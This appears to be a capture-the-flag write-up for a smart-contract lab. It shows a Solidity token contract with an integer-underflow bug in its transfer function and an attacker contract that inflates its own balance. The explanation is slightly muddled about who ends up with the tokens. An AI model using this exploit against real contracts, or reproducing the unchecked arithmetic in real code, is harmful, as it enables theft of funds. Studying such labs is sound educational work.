<div align="center">

# Token

</div>



**Token (Vulnerable Code) :**


<details>
<summary>Code</summary>

```solidity

// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Token {
    mapping(address => uint256) balances;
    uint256 public totalSupply;

    constructor(uint256 _initialSupply) public {
        balances[msg.sender] = totalSupply = _initialSupply;
    }

    function transfer(address _to, uint256 _value) public returns (bool) {
        require(balances[msg.sender] - _value >= 0);
        balances[msg.sender] -= _value;
        balances[_to] += _value;
        return true;
    }

    function balanceOf(address _owner) public view returns (uint256 balance) {
        return balances[_owner];
    }
}

```

</details>

---------

**Approach and Exploit Method Including Code :** 

1. **Understand the contract**
   - The token stores balances in `mapping(address => uint256) balances;`.
   - `transfer(address _to, uint256 _value)` does:
     ```solidity
     require(balances[msg.sender] - _value >= 0);
     balances[msg.sender] -= _value;
     balances[_to] += _value;
     ```
   - In **Solidity 0.6**, unsigned integer under/overflow **does not automatically revert**. Subtracting a larger value from a smaller one will **wrap** (wrap-around) to a very large `uint256` value.
   - The `require(...)` check is useless here because the expression uses unsigned integers — the subtraction underflows before the comparison in a way that makes the require not prevent the wrap (and on some compilers the logic allows it through).

2. **Exploit Method**
   - We want to trigger an underflow on `balances[msg.sender] -= _value` so that `balances[msg.sender]` becomes a very large number.
   - To do that, call `transfer(_to, value)` from a contract that has `balances[contract] == 0` and pass `_to` as your EOA.
   - The subtraction `0 - 21` underflows to `2**256 - 21` (a huge number), so the contract's balance becomes massive and the `_to` address receives `value` (e.g., 21). The attacker now has many tokens (or can repeat to increase balances).


  
## Exploit Code

```Solidity

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


contract MintUnlimitedToken{

    Token public token;

    constructor (address _target){
        token = Token(_target);
    }

    function MintToken()public {
        token.transfer(msg.sender, 21 );
    }
    function getBalance() public view returns (uint256) {
        return token.balanceOf(address(this));
    }
}


```



---


